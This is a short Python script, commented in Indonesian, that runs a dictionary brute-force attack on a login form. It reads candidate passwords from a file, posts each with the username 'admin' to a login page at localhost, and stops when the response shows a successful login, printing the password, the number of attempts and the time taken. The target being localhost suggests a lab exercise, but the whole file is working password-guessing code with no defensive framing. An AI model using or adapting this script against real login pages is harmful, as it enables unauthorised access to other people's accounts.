import requests
import time

# URL target
target_url = "http://localhost/login.php"

# Username target (diasumsikan sudah diketahui)
username = "admin"

# Daftar password yang akan dicoba
with open("passwords.txt", "r") as f:
    passwords = [line.strip() for line in f.readlines()]

# Waktu mulai
start_time = time.time()

# Counter percobaan
attempts = 0

# Melakukan serangan
for password in passwords:
    attempts += 1
    
    # Data untuk dikirim
    data = {
        "username": username,
        "password": password
    }
    
    # Mengirim request
    response = requests.post(target_url, data=data)
    
    # Memeriksa apakah login berhasil
    if "Login berhasil" in response.text:
        end_time = time.time()
        print(f"Password ditemukan: {password}")
        print(f"Jumlah percobaan: {attempts}")
        print(f"Waktu yang dibutuhkan: {end_time - start_time:.2f} detik")
        break

    # Opsional: Menampilkan progress
    if attempts % 100 == 0:
        print(f"Sudah mencoba {attempts} password...")
